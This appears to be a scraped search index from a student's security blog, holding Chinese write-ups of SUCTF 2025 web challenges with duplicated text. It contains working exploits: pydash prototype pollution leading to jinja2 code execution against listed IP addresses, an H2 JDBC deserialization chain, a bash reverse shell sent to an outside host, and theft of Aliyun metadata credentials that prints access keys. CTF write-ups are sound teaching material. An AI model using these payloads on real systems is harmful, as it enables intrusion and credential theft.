\u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; 